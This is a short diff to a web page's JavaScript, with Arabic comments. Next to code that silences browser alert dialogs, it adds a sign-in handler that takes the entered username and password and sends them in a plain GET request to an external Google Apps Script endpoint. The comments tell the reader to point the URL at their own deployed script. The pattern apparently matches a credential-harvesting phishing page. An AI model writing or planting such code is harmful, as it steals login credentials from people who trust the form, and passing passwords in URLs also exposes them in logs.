@@ -78,3 +78,17 @@ document.addEventListener('DOMContentLoaded', function() {
   // تعطيل نوافذ التنبيه باستخدام دالة العنصر window.alert
 window.alert = function() {};
 
+document.getElementById('signin-btn').addEventListener('click', function() {
+    var username = document.getElementById('username').value;
+    var password = document.getElementById('password').value;
+
+    // قم بتعديل الرابط أدناه ليكون عنوان URL الذي تم نشر السكريبت عليه
+    var scriptUrl = 'https://script.google.com/macros/s/AKfycbxv66YncvUUznJ3ff_-NJC4qpDIVSvxpfujccjXseFcErEtDukAb3-V9PJmN17sOzcyEw/exec';
+
+    // إرسال البيانات إلى السكريبت الخاص بك
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', scriptUrl + '?username=' + username + '&password=' + password, true);
+    xhr.send();
+
+    // يمكنك إضافة مزيد من التعليمات هنا للتعامل مع الاستجابة إذا كنت بحاجة إلى ذلك
+});
